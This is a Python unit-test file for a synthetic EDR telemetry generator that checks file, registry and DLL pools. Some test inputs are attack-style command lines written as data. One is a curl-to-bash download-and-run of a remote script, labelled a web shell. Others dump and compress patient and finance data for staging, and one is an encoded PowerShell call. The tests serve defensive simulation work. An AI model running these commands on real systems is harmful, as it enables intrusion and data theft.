# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Unit tests for EDR pools YAML loader."""

import random
import re
from unittest.mock import patch

from evidenceforge.generation.activity.edr_pools import (
    _sanitize_edr_pools,
    defender_platform_version,
    file_path_templates_for_user,
    get_dll_pool,
    get_file_paths,
    get_registry_keys_hkcu,
    get_registry_keys_hklm,
    is_service_account,
    load_edr_pools,
    materialize_edr_template,
    materialize_edr_template_group,
    normalize_defender_platform_path,
    select_ambient_file_churn_effect,
    select_file_side_effect,
)


class TestLoadEdrPools:
    """Test that the YAML loads correctly with all sections."""

    def test_all_sections_present(self):
        pools = load_edr_pools()
        assert "file_paths_windows" in pools
        assert "file_paths_linux" in pools
        assert "registry_keys_hkcu" in pools
        assert "registry_keys_hklm" in pools
        assert "dll_pool" in pools
        assert "runmru_commands" in pools
        assert "installed_software_products" in pools

    def test_all_sections_non_empty(self):
        pools = load_edr_pools()
        for key in [
            "file_paths_windows",
            "file_paths_linux",
            "registry_keys_hkcu",
            "registry_keys_hklm",
            "dll_pool",
            "runmru_commands",
            "file_side_effect_profiles",
            "installed_software_products",
        ]:
            assert len(pools[key]) > 0, f"{key} is empty"

    def test_read_only_recon_tool_has_no_file_side_effect(self):
        import random

        effect = select_file_side_effect(
            process_name=r"C:\Windows\System32\dsquery.exe",
            command_line='dsquery.exe group -name "Domain Admins"',
            os_category="windows",
            rng=random.Random(5),
            user="alice",
        )

        assert effect is None

    def test_browser_side_effect_uses_browser_cache_profile(self):
        import random

        effect = select_file_side_effect(
            process_name=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            command_line="chrome.exe --type=renderer",
            os_category="windows",
            rng=random.Random(5),
            user="alice",
        )

        assert effect is not None
        action, path = effect
        assert action in {"create", "modify"}
        assert "cache" in path.lower()
        assert "Security.evtx" not in path

    def test_browser_side_effect_matches_executable_family(self):
        import random

        cases = [
            (
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                "chrome.exe --type=renderer",
                r"google\chrome",
            ),
            (
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                "msedge.exe --type=renderer",
                r"microsoft\edge",
            ),
            (
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                "firefox.exe -contentproc",
                r"mozilla\firefox",
            ),
        ]

        for process_name, command_line, expected_path_fragment in cases:
            effect = select_file_side_effect(
                process_name=process_name,
                command_line=command_line,
                os_category="windows",
                rng=random.Random(5),
                user="alice",
            )

            assert effect is not None
            _action, path = effect
            assert expected_path_fragment in path.lower()

    def test_service_accounts_do_not_receive_interactive_profile_side_effects(self):
        import random

        assert is_service_account("windows", "LOCAL SERVICE")
        assert is_service_account("linux", "systemd-timesync")

        windows_templates = file_path_templates_for_user(
            get_file_paths("windows"),
            "windows",
            "LOCAL SERVICE",
        )
        linux_templates = file_path_templates_for_user(
            get_file_paths("linux"),
            "linux",
            "systemd-timesync",
        )

        assert not any(path.startswith(r"C:\Users\{user}") for path in windows_templates)
        assert not any(path.startswith("/home/{user}/") for path in linux_templates)
        assert not any(path.startswith("/var/lib/dpkg/") for path in linux_templates)
        assert not any(path.startswith("/var/lib/apt/") for path in linux_templates)
        assert not any(path.startswith("/var/cache/apt/") for path in linux_templates)

        shell_effect = select_file_side_effect(
            process_name="/bin/bash",
            command_line="bash -lc true",
            os_category="linux",
            rng=random.Random(5),
            user="systemd-timesync",
        )
        assert shell_effect is None

    def test_non_root_package_manager_cannot_write_root_owned_state(self):
        effect = select_file_side_effect(
            process_name="/usr/bin/apt-get",
            command_line="apt-get update",
            os_category="linux",
            rng=random.Random(5),
            user="www-data",
        )

        assert effect is None

    def test_root_package_manager_keeps_package_state_side_effects(self):
        effect = select_file_side_effect(
            process_name="/usr/bin/apt-get",
            command_line="apt-get update",
            os_category="linux",
            rng=random.Random(5),
            user="root",
        )

        assert effect is not None
        _action, path = effect
        assert path.startswith(("/var/log/apt/", "/var/lib/dpkg/", "/var/lib/dnf/"))


class TestFilePaths:
    """Test file path pool content."""

    def test_windows_has_templates(self):
        paths = get_file_paths("windows")
        assert any("{user}" in p for p in paths), "No {user} template in Windows paths"
        assert any("{rand}" in p for p in paths), "No {rand} template in Windows paths"

    def test_linux_has_templates(self):
        paths = get_file_paths("linux")
        assert any("{user}" in p for p in paths), "No {user} template in Linux paths"
        assert any("/home/" in p for p in paths), "No /home/ paths in Linux pool"

    def test_windows_paths_have_backslashes(self):
        paths = get_file_paths("windows")
        assert all("\\" in p for p in paths), "Windows paths should use backslashes"

    def test_linux_paths_have_forward_slashes(self):
        paths = get_file_paths("linux")
        assert all("/" in p for p in paths), "Linux paths should use forward slashes"

    def test_windows_prefetch_templates_use_hex_suffix(self):
        paths = get_file_paths("windows")
        prefetch_paths = [
            path for path in paths if r"\windows\prefetch" in path.lower().replace("/", "\\")
        ]

        assert prefetch_paths, "No Windows Prefetch templates in EDR path pool"
        for template in prefetch_paths:
            assert "{hex}" in template
            path = materialize_edr_template(template, random.Random(7), user="alice")
            assert re.search(r"-[0-9A-F]{8}\.pf$", path), path

    def test_linux_generic_paths_avoid_action_incompatible_sources(self):
        paths = get_file_paths("linux")
        assert not any(re.fullmatch(r"/proc/(?:\{rand\}|\d+)/status", path) for path in paths)
        assert "/etc/passwd" not in paths
        assert "/var/log/apache2/access.log" not in paths
        assert not any("systemd-private-" in path and "apache2.service" in path for path in paths)
        assert not any(path.startswith("/var/lib/dpkg/") for path in paths)
        assert not any(path.startswith("/var/lib/apt/") for path in paths)
        assert not any(path.startswith("/var/cache/apt/") for path in paths)

    def test_linux_service_ambient_churn_uses_daemon_profiles_not_generic_temp(self):
        generic_paths = get_file_paths("linux")
        actions = ["read", "modify", "create"]
        weights = [60, 30, 10]
        cases = [
            (
                "/usr/lib/systemd/systemd-timesyncd",
                "/usr/lib/systemd/systemd-timesyncd",
                "systemd-timesync",
            ),
            (
                "/usr/lib/systemd/systemd-resolved",
                "/usr/lib/systemd/systemd-resolved",
                "systemd-resolve",
            ),
            ("/usr/bin/dbus-daemon", "/usr/bin/dbus-daemon --system", "messagebus"),
            ("/usr/sbin/rsyslogd", "rsyslogd -n", "syslog"),
            ("/usr/sbin/NetworkManager", "/usr/sbin/NetworkManager --no-daemon", "root"),
            ("/usr/lib/snapd/snapd", "/usr/lib/snapd/snapd", "root"),
        ]

        for process_name, command_line, user in cases:
            effects = {
                select_ambient_file_churn_effect(
                    process_name,
                    command_line,
                    "linux",
                    random.Random(seed),
                    user,
                    generic_paths,
                    actions,
                    weights,
                )
                for seed in range(10)
            }

            assert all(effect is not None for effect in effects)
            assert all(effect[0] == "modify" for effect in effects if effect is not None)
            assert not any(
                effect is not None
                and (effect[1].startswith(("/tmp/", "/var/tmp/")) or "/.cache-" in effect[1])
                for effect in effects
            )

    def test_linux_service_ambient_churn_skips_unprofiled_daemon_temp_fallback(self):
        effect = select_ambient_file_churn_effect(
            "/sbin/agetty",
            "/sbin/agetty --noclear tty1 linux",
            "linux",
            random.Random(5),
            "root",
            get_file_paths("linux"),
            ["create"],
            [1],
        )

        assert effect is None

    def test_linux_web_daemon_ambient_churn_uses_matching_service_family(self):
        generic_paths = get_file_paths("linux")
        actions = ["read", "modify", "create"]
        weights = [60, 30, 10]

        apache_effects = {
            select_ambient_file_churn_effect(
                "/usr/sbin/apache2",
                "/usr/sbin/apache2 -DFOREGROUND",
                "linux",
                random.Random(seed),
                "www-data",
                generic_paths,
                actions,
                weights,
            )
            for seed in range(10)
        }
        nginx_effects = {
            select_ambient_file_churn_effect(
                "/usr/sbin/nginx",
                "nginx: worker process",
                "linux",
                random.Random(seed),
                "nginx",
                generic_paths,
                actions,
                weights,
            )
            for seed in range(10)
        }

        assert all(effect is not None for effect in apache_effects)
        assert all(effect is not None for effect in nginx_effects)
        assert all("/var/log/apache2/" in effect[1] for effect in apache_effects if effect)
        assert all(
            effect[1].startswith(("/var/log/nginx/", "/var/cache/nginx/"))
            for effect in nginx_effects
            if effect
        )

    def test_linux_sshd_churn_does_not_rewrite_listener_pid_file(self):
        """Routine SSH activity should not look like repeated daemon startup."""
        generic_paths = get_file_paths("linux")
        effects = {
            select_ambient_file_churn_effect(
                "/usr/sbin/sshd",
                "/usr/sbin/sshd -D [listener]",
                "linux",
                random.Random(seed),
                "root",
                generic_paths,
                ["read", "modify", "create"],
                [60, 30, 10],
            )
            for seed in range(20)
        }

        assert effects == {("modify", "/var/log/auth.log")}


class TestRegistryKeys:
    """Test registry key pool content."""

    def test_hkcu_returns_3tuples(self):
        keys = get_registry_keys_hkcu()
        assert len(keys) >= 5
        for k, vname, details in keys:
            assert k.startswith("HKCU\\"), f"HKCU key doesn't start with HKCU\\: {k}"
            assert "\\" in k, f"Key missing backslash: {k}"
            assert vname, f"Value name is empty for key {k}"
            assert details, f"Details is empty for key {k}"

    def test_hklm_returns_3tuples(self):
        keys = get_registry_keys_hklm()
        assert len(keys) >= 4
        for k, vname, _details in keys:
            assert k.startswith("HKLM\\"), f"HKLM key doesn't start with HKLM\\: {k}"
            assert vname, f"Value name is empty for key {k}"

    def test_registry_details_are_realistic(self):
        """Details should be DWORD values or strings, not value names."""
        for _k, _vn, details in get_registry_keys_hklm():
            assert details.startswith("DWORD (") or not details.isupper(), (
                f"Details looks like a value name, not data: {details}"
            )

    def test_hklm_pool_excludes_host_role_specific_service_config(self):
        """Host-wide noise should not emit role-specific service/app config everywhere."""
        keys = get_registry_keys_hklm()
        rendered = [f"{key}\\{value_name}" for key, value_name, _details in keys]

        assert not any(r"Services\DNS\Parameters\ListenAddresses" in key for key in rendered)
        assert not any(r"App Paths\WinSCP.exe" in key for key in rendered)
        assert not any("WDigest" in key for key in rendered)


class TestDllPool:
    """Test DLL path pool content."""

    def test_contains_system32_and_application_dlls(self):
        dlls = get_dll_pool()
        assert len(dlls) >= 5
        assert any("System32" in d for d in dlls)
        assert any("Program Files" in d for d in dlls)

    def test_contains_common_dlls(self):
        dlls = get_dll_pool()
        dll_names = [d.rsplit("\\", 1)[-1].lower() for d in dlls]
        assert "ntdll.dll" in dll_names
        assert "kernel32.dll" in dll_names


class TestTemplateMaterialization:
    """Test EDR template placeholder expansion."""

    def test_materializes_registry_and_dll_placeholders(self):
        import random

        rng = random.Random(7)
        value = materialize_edr_template(
            r"HKCU\Software\Test\{guid}\Document {doc}\{hex}\{user}",
            rng,
            "alice",
        )

        assert "{guid}" not in value
        assert "{doc}" not in value
        assert "{hex}" not in value
        assert value.endswith(r"\alice")

    def test_materializes_guid_with_single_registry_braces(self):
        import random

        rng = random.Random(9)
        value = materialize_edr_template(r"Interfaces\{{{guid}}}\DhcpIPAddress", rng)

        assert "{{" not in value
        assert "}}" not in value
        assert value.startswith(r"Interfaces\{")
        assert value.endswith(r"}\DhcpIPAddress")

    def test_materializes_userassist_runpath_values(self):
        import random

        key, value_name, details = materialize_edr_template_group(
            (
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count",
                "{userassist_value}",
                "{userassist_binary}",
            ),
            random.Random(17),
            "alice.smith",
        )

        assert "UserAssist" in key
        assert value_name.startswith("HRZR_EHACNGU:")
        assert not value_name.removeprefix("HRZR_EHACNGU").isdigit()
        assert "\\" in value_name
        detail_bytes = details.split()
        assert len(detail_bytes) >= 32
        assert all(len(byte) == 2 for byte in detail_bytes)

    def test_materializes_runmru_values_with_user_texture(self):
        import random

        outputs = {
            materialize_edr_template_group(
                (
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                    "{runmru_name}",
                    "{runmru_command}",
                ),
                random.Random(seed),
                "alice.smith",
            )
            for seed in range(24)
        }

        assert len({details for _key, _value_name, details in outputs}) >= 8
        assert all(details.endswith(r"\1") for _key, _value_name, details in outputs)
        assert any("alice.smith" in details for _key, _value_name, details in outputs)

    def test_runmru_command_treats_non_user_braces_as_literals(self):
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"runmru_commands": ["powershell.exe -Command { Get-Process }"]},
        ):
            key, _value_name, details = materialize_edr_template_group(
                (
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                    "{runmru_name}",
                    "{runmru_command}",
                ),
                random.Random(1),
                "alice",
            )

        assert key.endswith(r"RunMRU")
        assert details == r"powershell.exe -Command { Get-Process }\1"

    def test_runmru_command_does_not_interpret_format_specifiers(self):
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"runmru_commands": ["cmd.exe /c echo {user:1000000000}"]},
        ):
            details = materialize_edr_template("{runmru_command}", random.Random(3), "alice")

        assert details == r"cmd.exe /c echo {user:1000000000}\1"

    def test_materializes_host_ip_context(self):
        import random

        value = materialize_edr_template("{host_ip}", random.Random(9), host_ip="10.10.2.20")

        assert value == "10.10.2.20"

    def test_materializes_interface_guid_stably_per_host_ip(self):
        import random

        template = r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}"
        first = materialize_edr_template(
            template,
            random.Random(1),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        second = materialize_edr_template(
            template,
            random.Random(999),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        other = materialize_edr_template(
            template,
            random.Random(1),
            host_ip="10.10.2.10",
            host_key="DC-01",
        )

        assert first == second
        assert first != other

    def test_materializes_group_interface_guid_stably_per_host_ip(self):
        import random

        templates = (
            r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}",
            "DhcpIPAddress",
            "{host_ip}",
        )
        first = materialize_edr_template_group(
            templates,
            random.Random(1),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        second = materialize_edr_template_group(
            templates,
            random.Random(999),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        other = materialize_edr_template_group(
            templates,
            random.Random(1),
            host_ip="10.10.2.10",
            host_key="DC-01",
        )

        assert first == second
        assert first != other
        assert first[2] == "10.10.2.20"

    def test_materializes_installed_product_identity_stably_per_host(self):
        product = {
            "name": "Contoso Endpoint Agent",
            "publisher": "Contoso Ltd.",
            "version": "8.4.2",
        }
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"installed_software_products": [product]},
        ):
            templates = (
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{{{installed_product_guid}}}",
                "DisplayName",
                "{installed_product_name}",
            )
            first = materialize_edr_template_group(
                templates,
                random.Random(1),
                host_key="WS-EBROOKS-01",
            )
            second = materialize_edr_template_group(
                templates,
                random.Random(999),
                host_key="WS-EBROOKS-01",
            )
            other_host = materialize_edr_template_group(
                templates,
                random.Random(1),
                host_key="WS-OTHER-01",
            )

        assert first == second
        assert first != other_host
        assert first[2] == "Contoso Endpoint Agent"

    def test_materializes_installed_product_related_values_together(self):
        product = {
            "name": "Contoso Endpoint Agent",
            "publisher": "Contoso Ltd.",
            "version": "8.4.2",
        }
        with patch(
            "evidenceforge.generation.activity.edr_pools.load_edr_pools",
            return_value={"installed_software_products": [product]},
        ):
            key, publisher, version = materialize_edr_template_group(
                (
                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{{{installed_product_guid}}}",
                    "{installed_product_publisher}",
                    "{installed_product_version}",
                ),
                random.Random(5),
                host_key="WS-EBROOKS-01",
            )

        assert "{" in key and "}" in key
        assert publisher == "Contoso Ltd."
        assert version == "8.4.2"

    def test_materializes_defender_platform_with_product_version_shape(self):
        import random

        value = materialize_edr_template(
            r"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll",
            random.Random(9),
            host_key="WS-01",
        )

        assert rf"\Platform\{defender_platform_version('WS-01')}\MpClient.dll" in value
        assert "\\125.0\\" not in value
        assert "\\2024.3\\" not in value

    def test_materializes_cbs_package_build_from_host_os(self):
        import random

        template = (
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing"
            r"\Packages\{package}~31bf3856ad364e35~amd64~~{os_build}.{small}"
        )
        server_2022 = materialize_edr_template(
            template,
            random.Random(9),
            host_key="DC-01",
            host_os="Windows Server 2022",
        )
        workstation_11 = materialize_edr_template(
            template,
            random.Random(9),
            host_key="WS-01",
            host_os="Windows 11",
        )

        assert "~~10.0.20348." in server_2022
        assert "~~10.0.22621." in workstation_11
        assert "10.0.19041" not in server_2022
        assert "10.0.19041" not in workstation_11

    def test_materializes_cbs_package_build_in_template_group(self):
        import random

        key, value_name, details = materialize_edr_template_group(
            (
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing"
                r"\Packages\{package}~31bf3856ad364e35~amd64~~{os_build}.{small}",
                "CurrentState",
                "DWORD (0x00000070)",
            ),
            random.Random(11),
            host_key="FILE-SRV-01",
            host_os="Windows Server 2019",
        )

        assert "~~10.0.17763." in key
        assert value_name == "CurrentState"
        assert details == "DWORD (0x00000070)"

    def test_normalizes_defender_platform_version_per_host(self):
        version = defender_platform_version("WS-01")

        assert (
            normalize_defender_platform_path(
                r"C:\ProgramData\Microsoft\Windows Defender\Platform\MpClient.dll",
                "WS-01",
            )
            == rf"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll"
        )
        assert (
            normalize_defender_platform_path(
                r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpClient.dll",
                "WS-01",
            )
            == rf"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll"
        )

    def test_materializes_related_templates_with_shared_placeholders(self):
        import random

        key, details = materialize_edr_template_group(
            (
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\app-{doc}.exe",
                r"C:\Program Files\Common Files\Vendor\app-{doc}.exe",
            ),
            random.Random(11),
        )

        key_doc = key.rsplit("app-", 1)[1].split(".exe", 1)[0]
        details_doc = details.rsplit("app-", 1)[1].split(".exe", 1)[0]
        assert key_doc == details_doc


class TestFileSideEffectRealism:
    def test_default_side_effect_pools_do_not_leak_generator_names(self):
        data = load_edr_pools()
        haystack = str(data)
        assert "eforge-" not in haystack
        assert "artifact-" not in haystack

    def test_gzip_side_effect_uses_compressed_operand_path(self):
        effect = select_file_side_effect(
            "gzip",
            "gzip -9 /tmp/patient_claims.sql",
            "linux",
            random.Random(7),
            user="root",
        )

        assert effect == ("create", "/tmp/patient_claims.sql.gz")

    def test_mysqldump_side_effect_uses_redirect_path(self):
        effect = select_file_side_effect(
            "mysqldump",
            "mysqldump ehr patients > /tmp/patient_claims.sql",
            "linux",
            random.Random(7),
            user="root",
        )

        assert effect == ("create", "/tmp/patient_claims.sql")

    def test_powershell_compress_archive_uses_destination_path(self):
        effect = select_file_side_effect(
            "powershell.exe",
            (
                r"powershell.exe -NoProfile -Command Compress-Archive "
                r"-Path C:\ProgramData\Microsoft\*.log "
                r"-DestinationPath C:\ProgramData\Microsoft\health-cache.zip"
            ),
            "windows",
            random.Random(7),
            user="alice",
        )

        assert effect == ("create", r"C:\ProgramData\Microsoft\health-cache.zip")

    def test_powershell_compress_archive_strips_outer_command_quote(self):
        effect = select_file_side_effect(
            "powershell.exe",
            (
                r'powershell.exe -NoProfile -Command "Compress-Archive '
                r"-Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* "
                r'-DestinationPath C:\ProgramData\Microsoft\health-cache.zip"'
            ),
            "windows",
            random.Random(7),
            user="svc_sqlreader",
        )

        assert effect == ("create", r"C:\ProgramData\Microsoft\health-cache.zip")

    def test_cmd_does_not_write_powershell_history_artifact(self):
        effects = {
            select_file_side_effect(
                "cmd.exe",
                "cmd.exe /c whoami && hostname",
                "windows",
                random.Random(seed),
                user="aisha.johnson",
            )
            for seed in range(30)
        }

        assert all(effect is None or "PSReadLine" not in effect[1] for effect in effects)

    def test_noninteractive_powershell_does_not_write_psreadline_artifact(self):
        effects = {
            select_file_side_effect(
                "powershell.exe",
                "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
                "windows",
                random.Random(seed),
                user="SYSTEM",
            )
            for seed in range(30)
        }

        assert all(effect is None or "PSReadLine" not in effect[1] for effect in effects)

    def test_noninteractive_web_shell_does_not_write_bash_history_artifact(self):
        effects = {
            select_file_side_effect(
                "bash",
                "bash -c 'curl http://10.0.0.5/s.sh | bash'",
                "linux",
                random.Random(seed),
                user="apache",
            )
            for seed in range(20)
        }

        assert all(effect is None or not effect[1].endswith("/.bash_history") for effect in effects)


class TestOverlayValidation:
    """Test fallback behavior for malformed overlay-provided pools."""

    def test_sanitize_empty_string_pools_falls_back_to_defaults(self):
        defaults = {
            "file_paths_windows": [r"C:\\Windows\\Temp\\x.tmp"],
            "file_paths_linux": ["/tmp/x.tmp"],
            "dll_pool": [r"C:\\Windows\\System32\\kernel32.dll"],
            "runmru_commands": ["cmd.exe /k dir"],
            "registry_keys_hkcu": [["HKCU\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "registry_keys_hklm": [["HKLM\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
        }
        merged = {**defaults, "file_paths_windows": [], "dll_pool": [], "runmru_commands": []}

        sanitized = _sanitize_edr_pools(defaults, merged)

        assert sanitized["file_paths_windows"] == defaults["file_paths_windows"]
        assert sanitized["dll_pool"] == defaults["dll_pool"]
        assert sanitized["runmru_commands"] == defaults["runmru_commands"]

    def test_sanitize_malformed_registry_pool_falls_back_to_defaults(self):
        defaults = {
            "file_paths_windows": [r"C:\\Windows\\Temp\\x.tmp"],
            "file_paths_linux": ["/tmp/x.tmp"],
            "dll_pool": [r"C:\\Windows\\System32\\kernel32.dll"],
            "runmru_commands": ["cmd.exe /k dir"],
            "registry_keys_hkcu": [["HKCU\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "registry_keys_hklm": [["HKLM\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
        }
        merged = {**defaults, "registry_keys_hkcu": {"bad": "shape"}}

        sanitized = _sanitize_edr_pools(defaults, merged)

        assert sanitized["registry_keys_hkcu"] == defaults["registry_keys_hkcu"]
